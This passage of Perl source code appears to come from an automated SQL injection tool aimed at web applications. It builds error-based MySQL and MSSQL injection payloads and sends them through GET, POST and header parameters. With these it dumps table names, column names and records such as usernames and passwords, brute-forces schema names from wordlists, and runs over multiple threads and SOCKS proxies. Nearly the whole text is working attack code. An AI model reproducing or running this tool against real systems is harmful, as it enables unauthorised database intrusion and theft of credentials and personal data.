} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "table_schema" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.tables" . $f_plus . "where" . $f_plus . "table_name=" . $choice1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$prefix = $content;
$prefix =~ m/ussr(.*?)ussr/img;
$prefix = $1; # ??, ? ??????? ???????
$current="";
$content="";
$sql_post="";
$sql_header_query="";
if ($prefix =~ m/-/imgs) {$prefix = "`" . $prefix . "`"}
$table_name = $prefix . "." . $table_name;
}
print "Table: $table_name\n";
print "----------\n";
}
print "-----------------------------------------\n";
print "Enter the column(s) name(s) - for example - id or id,username,user_password:\n";
$choice = <STDIN>;
chomp $choice;
$column_name = $choice;
print FILE "-----------------------------------------\n";
print FILE "Dump column(s): [ " . $column_name . " ] from [ " .$table_name . " ]\n";
print FILE "-----------------------------------------\n";
print "Dump column(s): [ " . $column_name . " ] from [ " .$table_name . " ]\n";
print "-----------------------------------------\n";
print "Do you want add condition to sql-query?\n";
print "----------\n";
print "for example - where id=1 ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice==1) {
print "-----------------------------------------\n";
print "Enter your condition here - only one condition, without 'where', '+' and quotes, example - id=1 :\n";
print "----------\n";
$choice = <STDIN>;
chomp $choice;
$where = $choice;
# ?????????:
($con,$whe) = split(/=/,$where);
if($whe =~ m/[^0-9]/img) {$where = $con . "=" . ascii_to_hex $whe}
print "Your condition: [ where $where ]\n";
$condition=1;
} else {
$condition=0;
}
if ($condition==0) {
print "----------\n";
## ?????? ???-?? ???????? ?? ??????? #
print "Count data from [ $table_name ]\n";
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(*)" . $sql_pref2 . $f_plus . "from" . $f_plus . $table_name . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table_name . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(*)" . $sql_pref2 . $f_plus . "from" . $f_plus . $table_name . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table_name . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(*)" . $sql_pref2 . $f_plus . "from" . $f_plus . $table_name . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table_name . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$column_name_p = $content;
$column_name_p =~ m/ussr(.*?)ussr/img;
$column_name_p = $1; # ???-?? ???????? ? ??????? ?? ????????? ???????
$current="";
$content="";
$sql_post="";
$sql_header_query="";
print "$column_name_p\n";
print "----------\n";
## start from2 ##
print "Get ALL data from " . $table_name . " (" . $column_name_p . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$column_name_p = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($column_name_p+1) . "]\n";
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## end from2
## ?????? ?????? ?? ??????? ##
for(0..$thr) {
$trl[$_] = threads->create(\&gets114111);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets114111 {
$| = 1;
while ($num<$column_name_p) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat_ws(0x3a," . $column_name . ")" . $sql_pref2 . $f_plus . "from" . $f_plus . $table_name . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table_name . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat_ws(0x3a," . $column_name . ")" . $sql_pref2 . $f_plus . "from" . $f_plus . $table_name . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table_name . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat_ws(0x3a," . $column_name . ")" . $sql_pref2 . $f_plus . "from" . $f_plus . $table_name . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table_name . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
if ($content =~ m/ussr(.*?)ussr/imgs) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;
$current="";
$content="";
$sql_post="";
$sql_header_query="";

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START2001;
} else {
## ?????? ?????? ?? ??????? ##
print "Count data from [ $table_name ] with [ where " . $where . " ] \n";
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(*)" . $sql_pref2 . $f_plus . "from" . $f_plus . $table_name . $f_plus . "where" . $f_plus . $where . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table_name . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(*)" . $sql_pref2 . $f_plus . "from" . $f_plus . $table_name . $f_plus . "where" . $f_plus . $where . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table_name . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(*)" . $sql_pref2 . $f_plus . "from" . $f_plus . $table_name . $f_plus . "where" . $f_plus . $where . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table_name . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$column_name_p = $content;
$column_name_p =~ m/ussr(.*?)ussr/img;
$column_name_p = $1; # ???-?? ???????? ? ??????? ?? ????????? ???????
$current="";
$content="";
$sql_post="";
$sql_header_query="";
print "$column_name_p\n";
print "----------\n";
## start from2 ##
print "Get ALL data from " . $table_name . " with [ where " . $where . " ] (" . $column_name_p . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$column_name_p = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($column_name_p+1) . "]\n";
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## end from2
for(0..$thr) {
$trl[$_] = threads->create(\&gets115111);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets115111 {
$| = 1;
while ($num<$column_name_p) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat_ws(0x3a," . $column_name . ")" . $sql_pref2 . $f_plus . "from" . $f_plus . $table_name . $f_plus . "where" . $f_plus . $where . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table_name . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat_ws(0x3a," . $column_name . ")" . $sql_pref2 . $f_plus . "from" . $f_plus . $table_name . $f_plus . "where" . $f_plus . $where . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table_name . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat_ws(0x3a," . $column_name . ")" . $sql_pref2 . $f_plus . "from" . $f_plus . $table_name . $f_plus . "where" . $f_plus . $where . $f_plus . "limit" . $f_plus . $num . ",1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table_name . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . $num . ",1)" . $f_filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
if ($content =~ m/ussr(.*?)ussr/img) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;
$current="";
$content="";
$sql_post="";
$sql_header_query="";

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START2001;
}
}# end 4
# floor brute tables & columns mysql4
if ($choice == 8) {
START2002:
print " [1] Brute table\n";
print " [2] Brute column\n";
print " [3] Main menu\n";
print "----------\n";
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
$current = $f_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat(0x7665723a,version())" . $sql_pref2 . $f_plus . "from" . $f_plus . $f_table . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
print "Check version(): ";
$content = scan_url();
$ver = $content;
$ver =~ m/ussr(.*?)ussr/img;
$ver = $1;
if ($ver) {
print " $ver \n";
} else {
print " Can't get data \n";
goto START2002;
}
print "-------------\n";
if ($choice == 1) {
open( FILE1, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print " Brute tables\n";
print " -------------\n";
print FILE1 " Brute tables\n";
print FILE1 " -------------\n";
open(FILE, "<", $source_table_list);
while(<FILE>) {
chomp;
push(@tables4, $_);
}
close(FILE);
print "Add prefix for brute tables ? ( for example - PHPBB_ ) (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
print "Enter your prefix for brute tables: ";
$choice = <STDIN>;
chomp $choice;
$pref_brute = $choice;
} else {
$pref_brute = "";
}
$size = 0;
$size = @tables4;
print "File: $source_table_list\n";
print "Tables: $size\n";
print "-------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets6123);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets6123 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current1 = $pref_brute . $tables4[$num];
$current = $f_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat_ws(0x3a," . $num . ")" . $sql_pref2 . $f_plus . "from" . $f_plus . $current1 . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $current1 . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print " ---> " . $current1 . "\n";
print FILE1 " " . $current1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE1);
goto START2002;
}
if ($choice == 2) {
open( FILE1, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print " Brute columns\n";
print " -------------\n";
print FILE1 " Brute columns\n";
print FILE1 " -------------\n";
print "Enter the table_name for brute: \n";
$choice = <STDIN>;
chomp $choice;
$table = $choice;
print "Brute columns for table [ " . $table . " ]\n";
print "-------------\n";
print " Check table exist: ";
$current = $f_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat(0x7665723a,version())" . $sql_pref2 . $f_plus . "from" . $f_plus . $table . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url();
$ver =$content;
$ver =~ m/ussr(.*?)ussr/img;
$ver = $1;
if ($ver) {
print " Ok \n";
} else {
print " No such table... \n";
goto START2002;
}
open(FILE, "<", $source_column_list);
while(<FILE>) {
chomp;
push(@columns4, $_);
}
close(FILE);
print "Add prefix for brute columns? ( for example - PHPBB_ ) (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
print "Enter your prefix for brute columns: ";
$choice = <STDIN>;
chomp $choice;
$pref_brute = $choice;
} else {
$pref_brute = "";
}
$size = 0;
$size = @columns4;
print "-------------\n";
print "File: $source_column_list\n";
print "Columns: $size\n";
print "-------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets7123);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets7123 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current1 = $pref_brute . $columns4[$num];
$current = $f_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat_ws(0x3a," . $current1 . ")" . $sql_pref2 . $f_plus . "from" . $f_plus . $table . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print " ---> " . $current1 . "\n";
print FILE1 " " . $current1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE1);
goto START2002;
}
if ($choice == 3) {
goto START_global;
}
}
if ($choice == 9) {goto START}
} #end floor(rand)
################################################## #######
if ($choice == 14) {goto START_global}
}
## end MYSQL ################################################## ################################################## ######
## MSSQL ##
if ($choice == 2) {
START_mssql:
if ($ms_url =~ m/^https:\/\/?([^\/]+)/i) {
$host7 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
$host = $host7;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;
print " DONE\n";
print "-----------------------------------------\n";
}
if ($use_socks == 1 && $socks_check == 0) {
$check_url = $host;
our $query = "GET / HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: http://" . $check_url . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Ubuntu/9.04 (jaunty) Shiretoko/3.5.1\r\n"
. "Connection: close\r\n\r\n";
print "----------------------------------------\n";
print "You choose mode with SOCKS, try to find good in $socks_file ...\n";
print "Timeout = 5 sec:\n";
print "----------------------------------------\n";
$socks_check = 0;
$check_socks = socks_check();
($current_proxy_host,$current_proxy_port,$socks_ty pe) = split(/:/,$check_socks);
$proxy_message = "$current_proxy_host:$current_proxy_port, SOCKS" . $socks_type;
if ($current_proxy_host) {
$socks_check = 1;
print "Will use --> $proxy_message\n";
} else {
$socks_check = 0;
$proxy_message = "No";
print "No good SOCKS in " . $socks_file . ", change mode. Exit...\n";
}
}
sub char($) {
$str1=$_[0];
$aa="";$bb="";
for ($i = 0; $i<length($str1); $i++ ) {
$aa = ord(substr($str1,$i,1));
if ( $i == 0 ) {$bb= "char(" . $aa . ")";} else { $bb= $bb. "%2bchar(" . $aa . ")" ;}
}
return "$bb";
}
print "----------------------------------------------------------\n";
print " Choose mode:\n";
print "----------------------------------------------------------\n";
print " [1] MSSQL inj system information\n";
print " [2] MSSQL inj get tables from information_schema (current DB)\n";
print " [3] MSSQL inj get column_name from table (current DB)\n";
print " [4] MSSQL inj get data from columns\n";
print "----------------------------------------------------------\n";
print " [5] Main menu\n";
print "----------------------------------------------------------\n";
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
if ($choice == 1) {
$host = $host7;
open( FILE, ">>" . "z_" . $host . ".txt" ); # ???? ??? ?????? ???????????
if ($ms_convert_in == 0) {
#$url1 = $ms_url . "(select" . $ms_spase . '@@version)' . $ms_close;
$url1 = $ms_url . '@@version' . $ms_close;
} else {
$url1 = $ms_url . 'convert(int,@@version)' . $ms_close;
}
if ($ms_convert_in == 0) {
$url2 = $ms_url . "(SeLect" . $ms_spase . "system_user)" . $ms_close;
} else {
$url2 = $ms_url . "convert(int,system_user)" . $ms_close;
}
if ($ms_convert_in == 0) {
$url3 = $ms_url . "(SeLect" . $ms_spase . "db_name())" . $ms_close;
} else {
$url3 = $ms_url . "convert(int,db_name())" . $ms_close;
}
@array = ($url1,$url2,$url3);
$size = @array; #???????? ?????? ???????
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "-----------------------------------------\n";
print "System information:\n";
print "-----------------------------------------\n";
print FILE "-----------------------------------------\n";
print FILE "HOST: $host\n";
print FILE "-----------------------------------------\n";
print FILE "System information:\n";
print FILE "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets666);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets666 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current = $array[$num];
if ($num == 0) {$mess = '@@version: '}
if ($num == 1) {$mess = "system_user: "}
if ($num == 2) {$mess = "db_name(): "}
$content = scan_url();
if ($content =~ m/$ms_pattern_sys_tab/imgs or $content =~ m/$ms_pattern_sys_tab1/imgs) {
print $mess . $1 . "\n";
print FILE $mess . $1 . "\n";
}
print $num . "\r";
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_mssql;
}
if ($choice == 2) {
$host = $host7;
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print FILE "=============================================" . "\n";
print FILE "Tables in information_schema:" . "\n";
print FILE "=============================================" . "\n";
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## ???-?? ?????? ? in_sch.tables
$current = $ms_url . "convert(int,(SeLeCT" . $ms_spase . "mid(char(39)%2bchar(94)%2bchar(39)%2BCAST(COUNT(*) %20AS%20varchar),1,1000)" . $ms_spase . "FROM". $ms_spase . "INfORmATION_ScHEMA.TaBLeS))" . $ms_close;
$content = scan_url();
$column_name_p1 = $content;
if ($column_name_p1 =~ m/$ms_pattern_data1/imgs || $column_name_p1 =~ m/$ms_pattern_data2/imgs || $column_name_p1 =~ m/$ms_pattern_data3/imgs) {
($a,$column_name_p) = split(/\'\^\'/, $1);
}
$column_name_p=10;
print "Tables in information_schema.tables - $column_name_p\n";
print "------------------------------------------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets691);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets691 {
$| = 1;
while ($num < $column_name_p) {
{ lock($num);
$num++; }
$i = $num;
if ($ms_convert_in == 0) {
$current = $ms_url . "(SeLect" . $ms_spase . "max(table_name)" . $ms_spase . "from" . $ms_spase ."(select". $ms_spase ."top". $ms_spase ."1". $ms_spase ."table_name". $ms_spase ."from". $ms_spase ."information_schema.tables". $ms_spase ."where". $ms_spase ."table_name". $ms_spase ."not". $ms_spase ."in". $ms_spase ."(select". $ms_spase ."top". $ms_spase . $i . $ms_spase . "table_name". $ms_spase ."from". $ms_spase ."information_schema.tables". $ms_spase ."order". $ms_spase . "by". $ms_spase ."table_name)". $ms_spase ."order". $ms_spase ."by". $ms_spase ."table_name)a)" . $ms_close;
print FILE " " . $current . "\n";

} else {
$current = $ms_url . "convert(int,(select" . $ms_spase . "max(table_name)" . $ms_spase . "from" . $ms_spase . "(select". $ms_spase ."top". $ms_spase ."1". $ms_spase ."table_name". $ms_spase ."from". $ms_spase ."information_schema.tables". $ms_spase ."where". $ms_spase ."table_name". $ms_spase ."not". $ms_spase ."in". $ms_spase ."(select". $ms_spase ."top". $ms_spase . $i . $ms_spase . "table_name". $ms_spase ."from". $ms_spase ."information_schema.tables". $ms_spase ."order". $ms_spase . "by". $ms_spase ."table_name)". $ms_spase ."order". $ms_spase ."by". $ms_spase ."table_name)a))" . $ms_close;
print FILE " " . $current . "\n";

}
print FILE " " . $current . "\n";
$content = scan_url();
if ($content =~ m/$ms_pattern_data1/imgs || $content =~ m/$ms_pattern_data2/imgs || $content =~ m/$ms_pattern_data3/imgs) {

print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_mssql;
}
if ($choice == 3) {
$host = $host7;
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice1 = <STDIN>;
chomp $choice1;
$table = $choice1;
print "Table: $choice1\n";
print "----------\n";
print FILE "-----------------------------------------\n";
print FILE "Columns from table [ $choice1 ]\n";
print FILE "-----------------------------------------\n";
print "Get columns from " . $choice1 . ":\n";
print "------------------------------------------------\n";
$table = char($choice1);
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## ???-?? ??????? ? in_sch.columns
$current = $ms_url . "convert(int,(SELECT" . $ms_spase . "mid(char(39)%2bchar(94)%2bchar(39)%2BCAST(COUNT(*) %20AS%20varchar),1,1000)" . $ms_spase . "FROM". $ms_spase . "INFORMATION_SCHEMA.columns" . $ms_spase . "where" . $ms_spase . "table_name=" . $table . "))" . $ms_close;
$content = scan_url();
$column_name_p1 = $content;
if ($column_name_p1 =~ m/$ms_pattern_data1/imgs || $column_name_p1 =~ m/$ms_pattern_data2/imgs || $column_name_p1 =~ m/$ms_pattern_data3/imgs) {
($a,$column_name_p) = split(/\'\^\'/, $1);
}
print "Columns in $choice1 - $column_name_p\n";
print "------------------------------------------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
$sms = 0;
$column_temp_ms = "";
for(0..$thr) {
$trl[$_] = threads->create(\&gets692);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets692 {
$| = 1;
while ($num < $column_name_p) {
{ lock($num);
$num++; }
$i = $num;
if ($ms_convert_in == 0) {
$current = $ms_url . "(select" . $ms_spase . "max(column_name)" . $ms_spase . "from" . $ms_spase . "(select". $ms_spase ."top". $ms_spase ."1". $ms_spase ."column_name". $ms_spase ."from". $ms_spase ."information_schema.columns". $ms_spase ."where". $ms_spase ."table_name=". $table . $ms_spase . "and". $ms_spase ."column_name". $ms_spase ."not". $ms_spase ."in". $ms_spase ."(select". $ms_spase ."top". $ms_spase . $i . $ms_spase . "column_name". $ms_spase ."from". $ms_spase ."information_schema.columns" . $ms_spase ."where". $ms_spase ."table_name=". $table . $ms_spase ."order". $ms_spase . "by". $ms_spase ."column_name)". $ms_spase ."order". $ms_spase ."by". $ms_spase ."column_name)a)" . $ms_close;
print FILE " " . $current . "\n";

} else {
$current = $ms_url . "convert(int,(select" . $ms_spase . "max(column_name)" . $ms_spase . "from" . $ms_spase . "(select". $ms_spase ."top". $ms_spase ."1". $ms_spase ."column_name". $ms_spase ."from". $ms_spase ."information_schema.columns". $ms_spase ."where". $ms_spase ."table_name=". $table . $ms_spase . "and". $ms_spase ."column_name". $ms_spase ."not". $ms_spase ."in". $ms_spase ."(select". $ms_spase ."top". $ms_spase . $i . $ms_spase . "column_name". $ms_spase ."from". $ms_spase ."information_schema.columns" . $ms_spase ."where". $ms_spase ."table_name=". $table . $ms_spase ."order". $ms_spase . "by". $ms_spase ."column_name)". $ms_spase ."order". $ms_spase ."by". $ms_spase ."column_name)a))" . $ms_close;
print FILE " " . $current . "\n";

}
$content = scan_url();
if ($content =~ m/$ms_pattern_data1/imgs || $content =~ m/$ms_pattern_data2/imgs || $content =~ m/$ms_pattern_data3/imgs) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
#print FILE " " . $current . "\n"; 
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_mssql;
}
if ($choice == 4) {
$host = $host7;
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice1 = <STDIN>;
chomp $choice1;
$table = $choice1;
print "Table: $table\n";
print "-----------------------------------------\n";
print "Enter the column(s) name(s) - for example - id or id,username,user_password:\n";
$choice = <STDIN>;
chomp $choice;
$column_name1 = $choice;
$column_name = "cast(" . $choice . $ms_spase . "as" . $ms_spase . "varchar)";
@column_spis = split(/,/,$column_name);
$size = @column_spis;
if ($size > 1) {
$column_name = "cast(";
$a = 0;
while ($a < $size) {
if ($a == ($size-1)) {
$column_name .= $column_spis[$a] . $ms_spase . "as" . $ms_spase . "varchar)";
} else {
$column_name .= $column_spis[$a] . $ms_spase . "as" . $ms_spase . "varchar)%2Bchar(58)%2Bcast(";
}
$a++;
}
}
print FILE "-----------------------------------------\n";
print FILE "Dump column(s): [ " . $column_name1 . " ] from [ " . $table . " ]\n";
print FILE "-----------------------------------------\n";
print "Dump column(s): [ " . $column_name1 . " ] from [ " .$table . " ]\n";
print "-----------------------------------------\n";
## ?????? ???-?? ???????? ?? ??????? #
print "Count data from [ $choice1 ]\n";
$current = $ms_url . "convert(int,(select" . $ms_spase . "TOP" . $ms_spase . "1". $ms_spase . "mid(char(39)%2bchar(94)%2bchar(39)%2BCAST(COUNT(*) %20AS%20varchar),1,1000)" . $ms_spase . "FROM" . $ms_spase . $table . "))" . $ms_close;
$content = scan_url();
$column_name_p1 = $content;
if ($column_name_p1 =~ m/$ms_pattern_data1/imgs || $column_name_p1 =~ m/$ms_pattern_data2/imgs || $column_name_p1 =~ m/$ms_pattern_data3/imgs) {
($a,$column_name_p) = split(/\'\^\'/, $1);
}
print "$column_name_p\n";
print "----------\n";
print "Get ALL data from " . $table . " (" . $column_name_p . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = 0; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-1;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$column_name_p = $choice2-1;
print "Dump records from [" . ($num+1) . "] to [" . ($column_name_p+1) . "]\n";
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
